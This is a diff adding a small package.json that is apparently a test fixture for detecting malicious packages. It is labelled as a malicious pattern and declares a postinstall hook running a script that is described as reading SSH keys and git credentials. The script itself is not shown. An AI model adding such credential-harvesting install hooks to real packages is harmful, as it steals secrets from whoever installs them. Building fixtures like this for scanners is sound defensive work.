@@ -1,0 +1,6 @@
+{
+  "name": "lwfx-ssh-key-reader",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): reads SSH keys and git credentials at install time",
+  "scripts": { "postinstall": "node collect.js" }
+}
